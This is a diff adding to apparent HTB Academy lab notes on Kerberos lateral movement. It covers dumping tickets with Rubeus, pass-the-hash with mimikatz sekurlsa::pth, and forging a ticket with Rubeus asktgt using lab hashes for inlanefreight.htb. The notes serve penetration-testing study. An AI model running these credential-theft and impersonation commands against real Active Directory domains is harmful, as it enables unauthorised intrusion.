@@ -42,3 +42,28 @@ We can launch powershell after performing ptt attack
 Enter-PSSession -ComputerName DC01
 ```
 ![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/7217a393-2261-4ee4-bee5-b82a9d821073)
+
+# Pass the ticket from Rubeus
+
+```bash
+Rubeus.exe dump /nowrap
+```
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/565d15b4-3c39-4e13-9843-84b6dffdde3e)
+
+## Pass the key over pass the hash
+From mimikatz:
+```bash
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
+<br>
+
+To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.
+From rubes `pass the ticket over pass the hash`:
+```bash
+Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+```
+NOTE:
+_Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't._
+<br>
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/f05df475-36bb-49e2-8a6d-6120ebff4580)
